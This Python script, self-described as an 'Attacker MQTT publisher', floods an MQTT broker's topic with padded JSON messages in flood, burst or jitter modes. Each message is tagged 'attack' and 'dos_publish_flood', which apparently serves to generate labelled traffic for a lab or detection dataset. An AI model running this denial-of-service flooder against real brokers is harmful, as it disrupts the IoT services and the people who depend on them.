#!/usr/bin/env python3
import argparse
import json
import random
import signal
import string
import time

import paho.mqtt.client as mqtt


def random_blob(n=64):
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


def parse_args():
    p = argparse.ArgumentParser(description="Attacker MQTT publisher")
    p.add_argument("--broker-host", default="127.0.0.1")
    p.add_argument("--broker-port", type=int, default=1883)
    p.add_argument("--topic", default="sensors/raw")
    p.add_argument("--qos", type=int, default=1)
    p.add_argument("--source-id", default="pub_attack")
    p.add_argument("--mode", choices=["flood", "burst", "jitter"], default="flood")
    p.add_argument("--rate", type=float, default=100.0, help="messages per second")
    p.add_argument("--burst-size", type=int, default=250)
    p.add_argument("--burst-pause", type=float, default=2.0)
    p.add_argument("--window-size", type=float, default=8.0)
    p.add_argument("--msg-type", default="qos1")
    p.add_argument("--payload-bytes", type=int, default=512)
    p.add_argument("--count", type=int, default=0, help="0 means infinite")
    return p.parse_args()


def build_payload(source_id, msg_type, window_size, seq, payload_bytes):
    return {
        "source_id": source_id,
        "label": "attack",
        "msg_type": msg_type,
        "window_size": window_size,
        "seq": seq,
        "attack_kind": "dos_publish_flood",
        "blob": random_blob(max(1, payload_bytes)),
        "ts": time.time(),
    }


def main():
    args = parse_args()

    client = mqtt.Client(client_id=f"{args.source_id}_client", clean_session=True)
    client.connect(args.broker_host, args.broker_port, keepalive=60)
    client.loop_start()

    running = True

    def _stop(_signum, _frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    seq = 0
    min_sleep = 1.0 / max(args.rate, 1.0)

    while running:
        if args.mode == "burst":
            for _ in range(args.burst_size):
                if not running:
                    break
                seq += 1
                payload = build_payload(args.source_id, args.msg_type, args.window_size, seq, args.payload_bytes)
                client.publish(args.topic, json.dumps(payload), qos=args.qos, retain=False)
                if args.count > 0 and seq >= args.count:
                    running = False
                    break
            if running:
                print(f"burst sent {args.burst_size} messages, sleeping {args.burst_pause}s")
                time.sleep(max(args.burst_pause, 0.01))
            continue

        if args.mode == "jitter":
            ws = random.choice([6.0, 8.0, 10.0, 12.0])
            seq += 1
            payload = build_payload(args.source_id, args.msg_type, ws, seq, args.payload_bytes)
            client.publish(args.topic, json.dumps(payload), qos=args.qos, retain=False)
            sleep_s = random.uniform(0.001, min_sleep)
            time.sleep(max(sleep_s, 0.0005))
        else:
            # flood mode
            seq += 1
            payload = build_payload(args.source_id, args.msg_type, args.window_size, seq, args.payload_bytes)
            client.publish(args.topic, json.dumps(payload), qos=args.qos, retain=False)
            time.sleep(max(min_sleep, 0.0005))

        if args.count > 0 and seq >= args.count:
            break

        if seq % 1000 == 0:
            print(f"published attack seq={seq}")

    client.loop_stop()
    client.disconnect()


if __name__ == "__main__":
    main()
